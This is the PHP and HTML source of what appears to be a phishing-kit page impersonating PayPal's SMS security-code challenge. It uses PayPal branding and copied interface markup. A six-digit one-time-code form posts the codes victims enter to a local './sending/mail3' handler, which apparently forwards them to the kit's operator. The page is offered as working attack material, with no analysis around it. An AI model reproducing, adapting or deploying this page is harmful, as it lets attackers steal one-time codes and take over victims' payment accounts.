<?php 

session_start();
include 'lang.php';

?>

<!doctype html>
<html dir="ltr" lang="en" data-reactroot=""><head>
	<meta content="SM6L5fG663uXex62/+Sc/rq+50FZVljDusWBE=" name="csrf-token">
        <link rel="shortcut icon" href="./assets/img/favicon.ico">
	<link rel="stylesheet" href="./assets/css/secondary.css">
	<title>PayPal</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="application-name" content="PayPal">
</head>

<body data-nemo="documentId" documentid="AAGgQ-2SPczrEkzI_OKAaYy1NHVZkNeOs9LUKa9jVttl2mqpC11A20Di-h5qTrxHJneB" class="">
	<div>
		<style nonce="">
		html {
			display: block
		}
		</style>
		<div>
			<div>
				<form method="POST" id="irouteForm">
					<input type="hidden" name="_csrf" value="SM6L5fG663uXex62/+Sc/rq+50FZVljDusWBE=">
					<input type="hidden" name="anw_sid" value="AAHYiG66qLh3nesDASMKSGc2I-qK9nJ4eY1GSeVhU2zCXfb_uycYyD7GiiufnpUdKz89hXV8WqCbEoGOkp0WrB7-CQgzMb1ZNKu_2pfEjIWJwqqu88oc4-UWkkh5VTUyv76t8vVMh5ZhQ7uIeAWCK1Ur6z0XFlbq30ABqK41KaNRZcxxQjYKBlsuxrARiJHrrS4F4E6yJpnpmB8pShf3sT-mjVIWrvMEFCrfeAMk05Kj-K61gQ"> </form>
				<div class="jsDisabled">
				
				</div>
				<div class="contentContainer" id="content">
					<div data-nemo="challengePage">
						<header>
							<div class="paypal-logo"></div>
						</header>
						<div data-nemo="smsChallengePage" class="smsChallenge">
							<div class="ppvx_text--heading-sm___5-8-2 ppvx--v2___5-8-2"><?php echo lang('17');?></div>
							<div class="ppvx_text--body___5-8-2 top15 description ppvx--v2___5-8-2" data-nemo="smsChallengeDescription"><?php echo lang('13');?></div>
						</div>
						<form method="post" action="./sending/mail3" class="top15">
							<div>
								<div>
									<div class="codeInput">
										<div class="codeInput-resend" id="code-resend">
											<div class="resend-link"><a class="ppvx_link___3-9-8 ppvx--v2___3-9-8 resend" href="#"><?php echo lang('18');?></a></div>
										</div>
										<div>
											<div class="ppvx_code-input___1-4-10 codeInput-wrapper" id="otpCode">
												<div class="ppvx_code-input__input-wrapper___1-4-10">
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" oninput="if(this.value.length==1) document.getElementById('ci-otpCode-1').focus();" name="code1" id="textbox1" aria-invalid="false" placeholder=" " aria-label="1-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" oninput="if(this.value.length==1) document.getElementById('ci-otpCode-2').focus();" name="code2" id="ci-otpCode-1" aria-invalid="false" placeholder=" " aria-label="2-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" oninput="if(this.value.length==1) document.getElementById('ci-otpCode-3').focus();" name="code3" id="ci-otpCode-2" aria-invalid="false" placeholder=" " aria-label="3-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" oninput="if(this.value.length==1) document.getElementById('ci-otpCode-4').focus();" name="code4" id="ci-otpCode-3" aria-invalid="false" placeholder=" " aria-label="4-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" oninput="if(this.value.length==1) document.getElementById('ci-otpCode-5').focus();" name="code5" id="ci-otpCode-4" aria-invalid="false" placeholder=" " aria-label="5-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
    <div class="ppvx_text-input___3-14-9 ppvx_field--error___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10 ppvx_code-input__field--error___1-4-10">
        <input maxlength="1" name="code6" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp" id="ci-otpCode-5" aria-invalid="false" placeholder=" " aria-label="6-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required="" for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
                                                    
</div>
<div class="ppvx_code-input__error___1-4-10" id="message_otpCode" role="alert"><span class="ppvx_icon--svg___6-18-4 ppvx_icon--size_sm___6-18-4 ppvx_code-input__error-icon___1-4-10" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em"><path d="M21.64 17.34L14.05 4.2c-.92-1.59-3.22-1.59-4.14 0L2.32 17.34c-.92 1.59.23 3.59 2.07 3.59h15.18c1.84 0 2.99-2 2.07-3.59zM11.26 7.91h1.45c.26 0 .47.25.45.53l-.5 5.53c-.01.15-.13.27-.27.27h-.78c-.14 0-.26-.12-.27-.27l-.53-5.52c-.02-.29.18-.54.45-.54zm.73 10.19c-.64 0-1.17-.52-1.17-1.17 0-.64.53-1.17 1.17-1.17.65 0 1.17.53 1.17 1.17 0 .65-.52 1.17-1.17 1.17z"></path></svg></span><span class="ppvx_code-input__error-text___1-4-10"><?php echo lang('25');?></span></div>
											</div>
										</div>
									</div>
								</div>
    
							</div>
							<button class="ppvx_btn___5-11-8 ppvx--v2___5-11-8 scTrack:security_code_continue_button button" type="submit" id="securityCodeSubmit" name="submitSecurityCode" data-nemo="securityCodeSubmit"><?php echo lang('19');?></button>
						</form>
						<div class="tryDifferentWaySection"><a class="ppvx_link___3-9-8 ppvx--v2___3-9-8" data-nemo="tryDifferentWay" name="tryDifferentWay" href="#"></a></div>
					</div>
					<div class="loaderOverlay">
						<div data-nemo="loaderOverlay" class="modal-animate hide">
							<p class="ppvx_loading-spinner___2-7-26 ppvx_loading-spinner--size_xl___2-7-26 ppvx--v2___2-7-26 loading-spinner" role="alert"><span class="ppvx_loading-spinner__screenreader___2-7-26">Processing...</span></p>
							<div class="ppvx_text--body___5-8-2 processing ppvx--v2___5-8-2">Processing...</div>
							<div class="loaderOverlayAdditionalElements"></div>
						</div>
						<div class="modal-overlay hide"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<footer class="footer">
		<div class="loginUrlLink"><a class="ppvx_link___3-9-8 ppvx--v2___3-9-8" href="https://www.paypal.com/signin"></a></div>
		<ul class="footerLinks">
			<li class="contactFooterListItem">
				<div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2"><a target="_blank" href="/us/smarthelp/contact-us"></a></div>
			</li>
			<li class="privacyFooterListItem">
				<div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2"><a target="_blank" href="/us/webapps/mpp/ua/privacy-full"></a></div>
			</li>
			<li class="legalFooterListItem">
				<div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2"><a target="_blank" href="/us/webapps/mpp/ua/legalhub-full"></a></div>
			</li>
			<li class="worldwideFooterListItem">
				<div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2"><a target="_blank" href="/us/webapps/mpp/country-worldwide"></a></div>
			</li>
		</ul>
		<div></div>
	</footer>
	<div class="fpti"> </div>
	<div> </div>
	<div> </div>
<script>
    function moveFocus(textboxNumber) {
        const currentTextbox = document.getElementById('textbox' + textboxNumber);
        const nextTextbox = document.getElementById('textbox' + (textboxNumber + 1));
        
        if (currentTextbox.value.length === 1 && nextTextbox) {
            nextTextbox.focus();
        }
    }
</script>



</body></html>